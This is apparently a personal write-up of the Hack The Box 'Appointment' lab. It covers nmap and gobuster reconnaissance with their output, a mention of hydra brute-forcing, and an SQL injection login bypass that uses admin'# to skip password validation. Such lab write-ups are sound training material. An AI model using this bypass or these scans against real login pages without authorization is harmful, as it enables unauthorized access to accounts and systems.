```toc
```
# HTB Notes - Appointment #

+ **Date**: 12-7-2022
+ **Author**: Noah Soqui
+ **Tags**: #Web #SQL #SQL_Injection

## Intelligence Gathering ##

Scanning machine
+ `sudo nmap -sV -sC -O TARGET_IP`
+ Output:
``` Shell
Nmap scan report for 10.129.124.141
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login
```

Noticing that it is an apache web server, will use <mark style="background: #BBFABBA6;">gobuster</mark> to fuzz for directories and php files 
``` Shell
gobuster dir --url http://10.129.124.141/ --wordlist /usr/share/wordlists/dirb/big.txt -x php
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.124.141/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/12/07 15:36:26 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://10.129.124.141/css/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.124.141/fonts/]
/images               (Status: 301) [Size: 317] [--> http://10.129.124.141/images/]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 313] [--> http://10.129.124.141/js/]
/server-status        (Status: 403) [Size: 279]
/vendor               (Status: 301) [Size: 317] [--> http://10.129.124.141/vendor/]
Progress: 40924 / 40940 (99.96%)===============================================================
2022/12/07 15:41:10 Finished
===============================================================
```

The index of the website is a login page, potentially has a possible SQL injection 

Other <mark style="background: #BBFABBA6;">good lists</mark> are in the git repository: `danielmiessler/SecLists`

## Misconfiguration and Vulnerability Analysis  ##

The login page could be vulnerable to a sql injection.

## Exploitation ##

On the login page, which takes a username and password, will use a SQL injection.
+ Assuming the SQL injection is something like this:
``` SQL
Select * FROM users WHERE username='INPUT_USER' AND password='INPUT_PASS'
```
+ Then by passing in `admin'#` as the username, will make the query look like this 
``` mySQL
Select * FROM users WHERE username='INPUT_USER'#' AND password='INPUT_PASS'
```
+ <mark style="background: #FF5582A6;">No longer validates the password </mark>

## Post Exploitation ##

After the SQL injection, the flag is displayed.

## Reporting ##

### Executive Summary ###

Spent some times scanning for other directories, though not much was helpful. Could use <mark style="background: #D2B3FFA6;">hydra</mark> with `http-post-form` switch, to brute-force, but that did not get in. Also scanned for other directories and PHP files, but nothing helpful was found with that. Then the simple SQL injection was found, which allowed access by skipping password validation. 

